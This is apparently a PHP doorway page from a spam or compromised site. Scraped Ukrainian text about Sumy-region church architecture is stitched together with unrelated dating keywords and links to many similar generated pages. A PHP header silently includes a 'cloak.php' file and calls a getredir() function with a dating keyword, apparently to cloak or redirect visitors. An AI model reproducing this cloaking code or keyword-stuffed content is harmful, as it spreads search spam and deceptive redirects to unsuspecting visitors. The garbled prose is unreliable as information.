<?php
if(!@include('cloak.php'))	@include('../cloak.php');
if(function_exists('getredir')){
	@getredir ('api', '%d0%b7%d0%bd%d0%b0%d0%b9%d0%be%d0%bc%d1%81%d1%82%d0%b2%d0%b0+%d0%b7+%d0%bb%d1%8e%d0%b4%d0%b8%d0%bd%d0%be%d1%8e+%d0%b2+%d0%9f%d1%83%d1%82%d0%b8%d0%b2%d0%bb%d1%8c+%d0%a3%d0%ba%d1%80%d0%b0%d1%97%d0%bd%d0%b0', '2021-05-21', 'pir_210521/UA_dat_geo_trans_ukr', 'ua_dating.txt');
}
?><!doctype html>
<html lang="">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<title>Карты городов Украины (144)</title>
	<meta name="description" content="Офіційний сайт Путивльської райдержадміністрації. КАВАЛЕРІДЗЕ – людини багатогранного таланту, видатного скульптора, художника, бібліотека розгорнула виставку-знайомство із циклу «Видатні особистості України»" />
	<link rel="canonical" href="https://masage.od.ua/img/247/dy-znayomstva-z-lyudinoyu.php" />
<?php if(!@include('../inc1mywp1.php')) @include('inc1mywp1.php'); ?>
						<div id="primary-menu" class="menu"><ul>
<li class="page_item page-item-2"><a href="https://masage.od.ua/img/196/fov-naykrashiy-trener.php">найкращий тренер знайомств Армянськ Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/457/jydon-shvidksne-znayomstvo-na.php">швидкісне знайомство на південь Кілія Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/208/soni-prosto-znayomstva-poruch.php">просто знайомства поруч Українка Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/313/mohe-noch-znayomstv-v.php">ночі знайомств в Теплодар Україна</a></li>
</ul></div>
						<div class="main-navigation-bg"></div>
						<div class="clearfix"></div>
					</nav><!-- #site-navigation -->
				</div>
			</div>

		</div>

	</header><!-- #masthead -->



	<div id="content" class="site-content">
	<div class="container"><div class="row"><div class="col-md-7 order-md-3">
	<div id="primary" class="content-area">
		<main id="main" class="site-main main-content-middle">


<article id="post-1" class="post-1 post type-post status-publish format-standard hentry category-uncategorized">
		<header class="entry-header">
		<h1 class="entry-title">Знайомства з людиною в Путивль Україна</h1><!-- .entry-meta -->
			</header><!-- .entry-header -->



	<div class="entry-content">

<p>
<p>З трьох боків перед входами були влаштовані прямокутні в плані ґанки—притвори. У середині XIX ст.</p><strong><a id='l1'></a><h2>Свято спорту в громаді | Новослобідська громада Путивльський район Сумської області</h2></strong><p>Внаслідок цих перебудов композиція споруди набула хрещатого характеру. При церкві первісно була невисока масивна дзвіниця, увінчана шатром. завершено реставрацію церкви й дзвіниці за проектом архітектора М. План першого ярусу Воскресенської церкви Сумщини. Такі контамінації характерні для архітектури Слобожанщини XVII—XVIIІ ст. Дуже пластичні абриси дахів трьох восьмериків. Восьмерики вівтаря і бабинця несуть восьмилоткові зімкнуті склепіння.</p>
<p>Зовні грані всіх компартиментів підкреслені на рогах півколонками або пілястрами. Портал вінчає високий трикутний фронтон зі зрізаною вершиною. Центральна голівка фронтона увінчана шишкою. Стіни церкви та дзвіниці муровані з цегли на вапняно—піщаному розчині, потиньковані й побілені. Після ремонту р. зовні мають пофарбування сіро—зеленої барви.</p>
<p>Усі профілі й форми декору набрані з лекальної цегли.</p>
		
			<br><ul>
			
				<li>найкраща програма підключення Біла Церква Україна.</li>
			
				<li>- це нові чорні побачення поблизу Пятихатки Україна;</li>
			
				<li>знайомства онлайн Київ Україна;</li>
			
				<li>putyvlske_krayeznavstvo by Геннадій Іванущенко - Issuu?</li>
			
				<li>елітні швидкісні побачення в Старобільськ Україна;</li>
			
				<li>компанія знайомств поблизу Іловайськ Україна!</li>
			
				<li>побачення сьогодні Носівка Україна!</li>
			
			</ul>
		
	<p>Сумська область колір. Маківки та хрести ковальської роботи позолочені. Під церквою первісно були великі склепінчасті підвали, пізніше засипані. Мурована дзвіниця, споруджена у р.</p>
		
			<br><ul>
			
				<li>знайомства для одинаків Херсон Україна.</li>
			
				<li>сайти знайомств з чоловіками Апостолове Україна;</li>
			
				<li>знайомства з курсантом Рені Україна;</li>
			
				<li>лесбіянки онлайн знайомства Болград Україна!</li>
			
				<li>пригодницькі побачення Сторожинець Україна;</li>
			
				<li>знайомства шоу Сніжне Україна!</li>
			
				<li>Бунін Іван Олексійович — Вікіпедія.</li>
			
			</ul>
		
	<p>Загальна висота дзвіниці дорівнює висоті центрального верху церкви. Четверик дзвіниці триповерховий. До західної грані у —х рр. Третій поверх має великі арки дзвонів. Восьмерик і верхній ярус четверика були призначені для дзвонів, тому перекриття між ними не було. Дзвіниця мурована з цегли й побілена. енциклопедія ім. Бажана,  Таранушенко С. Цапенко М. Архитектура Левобережной Украины XVII—XVIII веков. Яблонский Д. Порталы в украинской архитектуре. Церква Св. Перша мурована Троїцька церква на цьому місці була збудована у р. Поряд з нею 6 травня р. Його будівництво велося протягом — рр.</p><strong><a id='l2'></a><h2>Знайомства Глухів</h2></strong><p>і було завершене в — рр. Автор проекту — сумський архітектор Карл Густавович Шольц. Збудовано церкву коштом сумського промисловця і мецената Павла Івановича Харитоненка — Церква була чинною до р. архітектори В. Хромченков і В. у вівтарі був установлений орган чехословацької фірми «Ріґер—Клосс». стилі неокласицизму. Верхні яруси дзвіниці вирішені за принципом «восьмерик на четверику». Під усією будівлею є напівпідвал, перекритий системою хрестових склепінь і виділений на фасадах масивним рустованим цоколем. Рустовані стіни розчленовані пілястрами цього ж ордера.</p><a id='l3'></a><h3>Підпишись на розсилку і дізнайся першим про наші пропозиції!</h3><p>Головний вхід із західного фасаду дзвіниці акцентований двоколонним портиком коринфського ордера. Будівля мурована з цегли, потинькована й побілена.</p>
		
	<p>Дахи укриті покрівельною сталлю по кроквяних фермах. Сумська область Джерела: 1. Скибицька Т. Церква Різдва Іоана Предтечі на Луці Мурована однобанна церква з дзвіницею міститься на північно—східній околиці Сум, яка має історичне найменування слобода Лука, на вул. Орджонікідзе,  Монастир був скасований у р.</p><a id='l4'></a><h3>Навігаційне меню</h3><p>На його місці в р. до церкви прибудовано два бічних вівтаря — Св. Трійці та Св. Дзвіниця є четвериком, прорізаним великими арковими отворами дзвону. Під церквою є підвал. Будівля вирішена в стилістиці пізнього провінційного класицизму. Брама в огорожі церковного подвір'я дульйонах. Вівтар акцентований на східному фасаді пілястровим портиком і фронтоном. Підлога з дощок. Церква разом із садибним комплексом Лінтварьових, хоча й дещо віддалені одне від одного, проте становлять єдине просторове й історико—культурне ціле.</p>
<p>Крига протікала іншим річищем, ближче до схилів, так що церква містилася на правому березі річки. Його змінила в р. за деякими іншими відомостями — у чи рр. Її вінчав чотиригранний намет з глухим ліхтарем і маківкою. Таким само був верх вівтаря і, ймовірно, верх бабинця. При цьому було розібрано верх бабинця і влаштовано над ним двосхилий дах.</p>
<p>Дзвіниця була двоярусною, типу «четверик на четверику». Ця церква була розібрана р. після того, як поряд у — рр. за проектом харківського єпархіального архітектора В. Покровського збудували однойменний мурований храм. Це традиційна для України за структурою тридільна однобанна церква з дзвіницею над західним притвором.</p><img src="https://img01.obyava.ua/classified/0/1435/7152/200-mjtufixawx0i629s.jpg" alt="Карта Путивля" style="max-width: 480px; max-height: 480px;"/><p>Церква св. Криги серед одноповерхової садибної забудови. Дзвіниця на західному рамені храму триярусна і набагато вища, ніж церковний верх. Верх дзвіниці вирішено у тих самих формах, що й вінчання церковної бані. У бабинці є невеликі хори у вигляді лоджії, вхід на які влаштовано з дзвіниці. На пандативах є олійні мальовання — рр. Вони поновлювалися у р. Церква збудована з червоної цегли на цементному розчині з розшивкою швів. Це унікальний архітектурний витвір доби пізнього історизму та модерну. Церкву виявлено й обстежено автором цієї книги в р.</p>
		
	<p>Самойлович И. Справочная книга для Харьковской епархии. Филарет Гумилевский. Наріжні верхи — глухі, центральний — світловий. Наріжники акцентовані гранчастими півколонами. Вигадливо вирішені віконні наличники, що. Церква святих Петра і Павла Мурована церква з дзвіницею міститься в правобережній частині заплави р. Східним фасадом виходить на вул. Вона була парафіяльним храмом слободи Криги, заснованої того ж року.</p>
</p>
	</div><!-- .entry-content -->

</article><!-- #post-1 -->


		</main><!-- #main -->
	</div><!-- #primary -->


	</div><div class="col-md-2 order-md-1">

	<aside id="secondary" class="widget-area">
			</aside><!-- #secondary -->
</div><div class="col-md-3 order-md-10">
	<aside id="secondary" class="widget-area">
		<section id="search-2" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://masage.od.ua/img/327/qap-msto-znayomstv-v.php">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></section>		<section id="recent-posts-2" class="widget widget_recent_entries">		<h2 class="widget-title">Recent Posts</h2>		<ul>
											<li><a href="https://masage.od.ua/img/103/lug-vikonavch-pobachennya.php">виконавчі побачення Таврійськ Україна</a></li><li><a href="https://masage.od.ua/img/266/lev-chorn-lesbyanki-znayomstva.php">чорні лесбіянки знайомства в Світловодськ Україна</a></li><li><a href="https://masage.od.ua/img/457/zijo-mstsya-znayomstv.php">місця знайомств Городок Україна</a></li><li><a href="https://masage.od.ua/img/103/furuh-ostrv-znayomstv-harkv.php">острів знайомств Харків Україна</a></li><li><a href="https://masage.od.ua/img/133/dupow-znayomstva-msto-poblizu.php">знайомства місто поблизу Бердянськ Україна</a></li><li><a href="https://masage.od.ua/img/106/hone-cholovki-znayomstva.php">чоловіки знайомства в Узин Україна</a></li>
					</ul>
		</section>

			<section id="meta-2" class="widget widget_meta"><h2 class="widget-title">Articles</h2>
				<ol><li><a href='#l1'>Свято спорту в громаді | Новослобідська громада Путивльський район Сумської області</a></li>
<li><a href='#l2'>Знайомства Глухів</a></li>
<li><a href='#l3'>Підпишись на розсилку і дізнайся першим про наші пропозиції!</a></li>
<li><a href='#l4'>Навігаційне меню</a></li>
</ol>
			</section>

	</aside><!-- #secondary -->
</div></div></div>	</div>
	<footer id="colophon" class="site-footer">

		<div class="covf-footer-copyright">
			<div class="container">
				<div class="row">
					<div class="col">
						<div class="site-info text-center">
							Powered by 	<a href="https://masage.od.ua/img/352/quxe-bezkoshtovn-veb.php">Covfefe WordPress Theme</a>
						</div>
					</div>
				</div>
			</div>
		</div>
	</footer><!-- #colophon -->
</div><!-- #page -->

<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/jquery.marquee.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/scripts.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/comment-reply.min.js?ver=5.0.3'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/wp-embed.min.js?ver=5.0.3'></script>

</body>
</html>